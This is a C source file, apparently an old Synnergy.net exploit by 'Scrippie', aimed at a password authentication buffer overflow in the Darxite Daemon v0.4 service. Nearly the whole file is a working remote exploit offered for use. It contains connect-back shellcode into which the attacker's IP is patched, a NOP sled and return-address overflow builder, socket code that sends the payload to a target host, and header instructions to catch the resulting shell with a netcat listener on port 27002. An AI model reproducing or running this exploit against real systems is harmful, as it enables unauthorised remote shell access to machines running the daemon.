/*
   Darxite Daemon v0.4 password authentication overflow
   ----------------------------------------------------

   dethy- whipped up a small advisory about this, since I was bored I took up
   writing a simple exploit.

   I tried to use some easy functions for string creation, and they seem to
   work pretty quick (no more hours of frustration writing for loops :).

   As always I used my own shellcode, you should do a "nc -l -p 27002" on the
   machine you fill in as "your IP" and execute this - if it works you'll have
   a shell in the netcat session.

   Lots of love go out to: Maja, Hester and Marleen
   Shouts go out to: my grandma

   void *vlieger;
   void *(useBrains)(void);

   vlieger = dlopen("/lib/flyahh.so", RTLD_LAZY);
   useBrains = dlsym(handle, "brainActivity");
   if(!useBrains) {
      fprintf(stderr, "Brains not found...\n");
      exit(-1);
   }
   ...

   flyahh.c: In function `main':
   flyahh.c:14: warning: expression always evaluates to true

   -- Scrippie/ronald@grafix.nl
*/

/* Synnergy.net 2000 (c) */

#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <string.h>

#define DARX_BUF	1024
#define NUM_NOPS	1000

int xconnect(unsigned long, unsigned int);
void readBanner(int socket);
char *strcreat(char *, char *, int);
char *stralign(char *, int);
char *longToChar(unsigned long);

char hellcode[]= 
"\xeb\x7a\x5e\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x8d\x4e\x1c\xb2\x01\x89\x56\x20\xb2\x06\x89\x56\x24\xb2\x02\x89\x56\x1c\xcd\x80\x89\x46\x18\x89\x16\x66\xc7\x46\x02\x69\x7a\x89\x46\x1c\x8d\x06\x89\x46\x20\x80\xc2\x0e\x89\x56\x24\x31\xc0\x04\x66\x80\xc3\x02\x8d\x4e\x1c\xcd\x80\x31\xc0\x04\x3f\x89\xc2\x8b\x5e\x18\x31\xc9\xcd\x80\x89\xd0\x41\xcd\x80\x89\xd0\x41\xcd\x80\x31\xc0\x8d\x7e\x0f\x80\xc1\x07\xf3\xaa\x04\x0b\x8d\x5e\x08\x89\x5e\x10\x8d\x4e\x10\x31\xd2\xcd\x80\x31\xc0\xfe\xc0\xcd\x80\xe8\x81\xff\xff\xff\x41\x41\x42\x42\xBB\xBB\xBB\xBB\x2f\x62\x69\x6e\x2f\x73\x68";

int main(int argc, char **argv)
{
   int sd;
   unsigned int align=0;
   unsigned long sip, retaddy=0xbffff928;
   char *iploc, *evilstring;

   if(argc < 4) {
      printf("Use as: %s <target IP> <target port> <your ip> [ret addy] [align]
         \n", argv[0]);
      exit(0);
   }

   if((sip = inet_addr(argv[3])) == -1) {
      perror("inet_addr()");
      exit(-1);
   }

   if(argc > 4) retaddy = strtoul(argv[4], NULL, 16);
   if(argc > 5) align = atoi(argv[5]);

   printf("Using return address: 0x%lx\n", retaddy);
   printf("Using alignment: %d\n", align);

   /* Locate the IP position in the shellcode */
   iploc=(char *)strchr(hellcode, 0xBB);
   memcpy((void *) iploc, (void *) &sip, 4);

   /* Generate the overflow string */

   evilstring = strcreat(NULL, "A", align);
      /* We memory leak 5 bytes here, don't make a service out of this :) */
   evilstring = strcreat(evilstring, longToChar(retaddy), (DARX_BUF+8)>>2);
   evilstring = strcreat(evilstring, "\x90", NUM_NOPS);
   evilstring = strcreat(evilstring, hellcode, 1);

   sd = xconnect(inet_addr(argv[1]), atoi(argv[2]));

   printf("Connected... Now sending overflow...\n");

   send(sd, evilstring, strlen(evilstring)+1, 0);

   free(evilstring);
   return(0);
}

/*
   Returns the socket descriptor to "ip" on "port"
*/

int xconnect(unsigned long ip, unsigned int port)
{
   struct sockaddr_in sa;       /* Sockaddr */
   int sd;                      /* Socket Descriptor */

   if((sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
      perror("socket()");
      exit(-1);
   }

   memset(&sa, 0x00, sizeof(struct sockaddr_in));
   sa.sin_port=htons(port);
   sa.sin_addr.s_addr=ip;

   if(connect(sd, &sa, sizeof(struct sockaddr_in)) == -1) {
      perror("connect()");
      exit(-1);
   }

   return(sd);
}

/*
   Yummy yummy function for easy string creation
*/

char *strcreat(char *dest, char *pattern, int repeat)
{
   char *ret;
   size_t plen, dlen=0;
   int i;

   if(dest) dlen = strlen(dest);
   plen = strlen(pattern);

   ret = (char *)realloc(dest, dlen+repeat*plen+1);

   for(i=0;i<repeat;i++) {
      strcat(ret, pattern);
   }
   return(ret);
}

/*
   Converts a long to an array containing this long
*/

char *longToChar(unsigned long blaat)
{
   unsigned int i;
   char *ret;

   ret = (char *)malloc(sizeof(long)+1);

   for(i=0;i<sizeof(long);i++) {
      ret[i] = (blaat >> (i<<3)) & 0xff;
   }
   ret[sizeof(long)] = 0x00;

   return(ret);
}